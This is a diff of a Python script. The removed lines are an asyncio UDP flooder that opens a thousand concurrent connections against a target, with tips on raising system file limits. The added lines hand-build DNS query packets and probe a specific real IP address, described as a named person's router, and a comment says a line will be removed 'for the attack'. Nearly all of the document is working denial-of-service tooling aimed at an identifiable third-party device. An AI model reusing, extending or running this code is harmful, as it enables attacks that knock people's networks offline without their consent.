@@ -1,58 +1,58 @@
-#!/usr/bin/env python3
 
-import socket
-import asyncio
+
 import random
-import sys
+import socket
+import struct
 
-# Delay factor, some noise is added.
-DELAY = 5
-UDP_IP = '10.0.0.1'
-UDP_PORT = 53
-MESSAGE = 'Got you bitch!'
 
-# Number of concurrent requests that are happening, threads are not used.
-# To get this above 1024 on linux, you have to edit /etc/security/limits.conf
-# and add a line like vita soft nofile 2000
-# and vita hard nofile 40000
-# You can check the status of these limits with ulimit -Hn and ulimit -Sn
-CONCURRENT_REQUESTS = 1000
+class sendDNSpacket:
+    def __init__(self, url, ip, port=53):
+        self.url = url
+        self.ip = ip
+        self.port = port
 
-def fl():
-    sys.stdout.flush()
+    def send_packet(self):
+        packet = self.build_packet()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(1)
+        sock.sendto(bytes(packet), (self.ip, self.port))
+        data, addr = sock.recvfrom(1024)
+        sock.close()
+        return data  # reomove this later for the attack
 
-async def hit_server(target):
-    await asyncio.gather(
-        *[asyncio.create_task(papercut(target, i)) for i in range(CONCURRENT_REQUESTS)]
-        )
+    def build_packet(self):
+        randomint = random.randint(0, 65535)
+        packet = struct.pack(">H", randomint)
+        packet += struct.pack(">H", 0x0100)
+        packet += struct.pack(">H", 1)
+        packet += struct.pack(">H", 0)
+        packet += struct.pack(">H", 0)
+        packet += struct.pack(">H", 0)
+        split_url = self.url.split(".")
+        for part in split_url:
+            packet += struct.pack("B", len(part))
+            for s in part:
+                packet += struct.pack('c', s.encode())
+        packet += struct.pack("B", 0)
+        packet += struct.pack(">H", 1)
+        packet += struct.pack(">H", 1)
+        return packet
 
-# Single thread that will keep attempting to
-# send requests to the server that _will_ time out.
-async def papercut(target, i):
-    while True:
-        soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        await asyncio.sleep(random.random()*DELAY)
-        soc.connect(target)
-        print('N', end='')
-        fl()
-        soc.sendto(bytes(MESSAGE, "utf-8"), (UDP_IP, UDP_PORT))
-        await asyncio.sleep(DELAY/2)
+def check_port():
+    # Eric and Hugh's down stairs router 74.110.211.52
+    s = sendDNSpacket('www.google.com', '74.110.211.52')
+    portOpen = False
+    for _ in range(5):
         try:
-            for v in range(20):
-                print('C', end='')
-                fl()
-                soc.send(('adsf' + str(v) + ": 5\r\n").encode())
-                await asyncio.sleep(DELAY/2 + random.random())
-        except BrokenPipeError:
-            print('B', end='')
-            fl()
-            soc.close()
+            s.send_packet()
+            portOpen = True
+            break
+        except socket.timeout:
+            pass
+    if portOpen:
+        print('port open')
+    else:
+        print('port closed')
+
 if __name__ == '__main__':
-    import sys
-    target = None
-    if len(sys.argv) == 1:
-        target = ('10.0.0.1', 80)
-    elif len(sys.argv) == 3:
-        import urlparse
-#        target =
-    asyncio.run(hit_server(target))
+    check_port()
